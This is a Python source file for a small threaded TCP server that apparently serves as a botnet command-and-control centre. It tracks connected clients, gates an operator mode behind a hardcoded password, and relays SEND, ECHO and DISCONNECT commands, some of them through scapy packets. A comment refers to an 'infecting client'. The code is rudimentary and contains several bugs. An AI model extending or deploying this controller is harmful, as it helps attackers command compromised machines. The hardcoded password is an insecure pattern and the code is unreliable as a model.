import socket
import threading
import socketserver
import time
from Conversions import *
from scapy.sendrecv import send
from scapy.all import *

class ThreadedServerHandler (socketserver.BaseRequestHandler):
    def __init__(self, iterable):
        print("INIT") 

    def handle(self):
        print("HERE")
        data = str(self.request.recv(1024), 'ascii')
        cur_thread = threading.current_thread()
        response = bytes("{}: {}".format(cur_thread.name, data), 'ascii')
        self.request.sendall(response)

class CommandCenter():
    def __init__(self):
        self.client_list = []

    def menu(self):
        menu = "CC-DATA\n[CLIENTS : print clients]   [COMMAND <IP> <OPTION> <(optional)>: command client]\n\t<IP> : Type in client's IP to send to specific client. ALL to send to all clients\n\t<OPTION>: [echo] [send] [disconnect]\n"
        return menu

    def clients(self, device):
        '''Prints all clients connected with the server'''
        if self.client_list == []:
            device.send_message("NO CLIENTS")
        else:
            print(len(self.client_list))
            device.send_message(str(len(self.client_list)))
            for i in self.client_list:
                device.send_message(i.ip)
  
    def excute_command(self, device, command, optional=None):
        if command != "SEND" and command != "DISCONNECT" and command != "ECHO":
            device.send_message(self.menu())
            return
        ###what happans when you send the packet. Does the server communicate back to the infecting client?
        
        if command == "SEND" and optional != None:
            entire_input = command + " " + optional
            print("DEBUG5: " + entire_input)
            packet = construct_packet(device.address, entire_input)
            device.send_message(packet)
            send(scapy_packet(device.address, entire_input))
        elif command == "DISCONNECT":
            packet = construct_packet(device.address, command)
            device.close()
        else:
            packet = construct_packet(device.address, "ECHO")
            device.send_message(packet)
            send(scapy_packet(device.address, "ECHO"))

    def command(self, addr, command, optional=None):
        if command != "ECHO" and command != "SEND" and command != "DISCONNECT":
            self.menu()
            return
        print("[COMMAND]")
        if addr == "ALL":
            for i in self.client_list:
                self.excute_command(i,command,optional)
        else:
            addr = addr.split(":", 1)
            addr[1] = int(addr[1])
            client = locateBy_(addr)
            if(client != None):
                self.excute_command(client, command,optional)

    def insert(self, client):
        self.client_list.append(client)
    
    def locateBy_(self, search, option):
        if option == 0:
            for i in self.client_list:
                if i.ip == search:
                    return i

class ClientInfo():
    def __init__(self, client, address):
        self.elevated = False
        self.client = client
        self.address = list(address)
        self.ip = address[0] 
        self.cc = CommandCenter()


    def elevatation(self, passwoCrd=None):
        #print(passwoCrd)
        if(passwoCrd == "PASSWORD"):
            self.elevated = True 
            self.send_message(construct_packet(self.address, "ACCESS GRANTED, WELCOME!"))
            send(scapy_packet(self.address, "ACCESS GRANTED, WELCOME!"))
        else:
            self.elevated = False


    def send_message(self, message):
        if type(message) is not bytes:
            message = message.encode()
            self.client.send(message)
        else:
            self.client.send(message)


    def close(self):
        self.client.close()


class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))
        self.cc = CommandCenter()

    def listen(self):
        self.sock.listen(1)
        while True:
            client, address = self.sock.accept()
            #client.settimeout()
            threading.Thread(target = self.listenToClient, args = (client,address)).start()

    def parser(self,message,client_instance):
        #print(message)
        message_list = message.split()
        print("[PARSER]" + message)
        if message != []:
            first = message_list[0]
            if first == "ACCESS" and len(message_list) == 2:
                    client_instance.elevatation(message_list[1])
            elif client_instance.elevated:
                print(client_instance.elevated)
                if first == "CLIENTS" and len(message_list) == 1:
                        self.cc.clients(client_instance)
                elif first == "DROP" and len(message) == 1:
                        client_instance.elevatation()
                elif message_list[1] == "ECHO" or message_list[1] == "SEND" or message_list[1] == "DISCONNECT":
                    if len(message_list) == 3:
                        #SEND
                        index = len(message_list[0] + message_list[1]) + 2
                        self.cc.command(message_list[0], message_list[1], message[index:])
                    elif len(message_list) == 2:
                        #ECHO OR DISCONNECT
                        self.cc.command(message_list[0], message_list[1])


    def listenToClient(self, client, address):
        size = 1024
        client_instance = ClientInfo(client, address)
        self.cc.insert(client_instance)
        print("ADDED CLIENT: ")
        print(str(client_instance.address))
        while True:
            #client_instance.send_message("Hello from Server")
            #packet = HTTP()/HTTPRequest(Referer=
            # "\u200d")
            #p = bytes(packet)
            #client.send(p)
            time.sleep(2)
            packet = client.recv(size)
            #data = data.decode()
            if packet:
                #Set the response to echo back the recieved data 
                data = deconstruct_packet(packet)
                self.parser(str(data), client_instance)
            else:
                raise print('Client disconnected')
            # try:
            #     data = client.recv(size)
            #     data = data.decode()
            #     if data:
            #         print(str(data))
            #         # Set the response to echo back the recieved data 
                    
            #         self.parser(str(data), client_instance)
            #         #response = data
            #         #client.send(response)
            #     else:
            #         raise print('Client disconnected')
            # except:
            #     print("something happends")
            #     #client.close()
            #     #return False

